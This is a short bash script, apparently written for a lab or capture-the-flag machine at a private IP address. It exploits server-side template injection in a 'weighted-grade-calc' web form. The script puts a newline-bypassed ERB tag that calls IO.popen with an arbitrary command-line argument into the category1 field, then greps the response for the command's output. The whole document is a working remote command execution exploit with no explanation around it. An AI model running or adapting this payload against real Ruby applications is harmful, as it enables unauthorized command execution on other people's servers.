#!/bin/bash

cmd=${1}

curl -X POST http://10.129.229.121/weighted-grade-calc \
  -d "category1=kek%0a<%25= IO.popen('${cmd}').readlines() %25>" \
  -d "grade1=0&weight1=100&category2=kek&grade2=0&weight2=0&category3=kek&grade3=0&weight3=0&category4=kek&grade4=0&weight4=0&category5=kek&grade5=0&weight5=0" \
  | grep kek
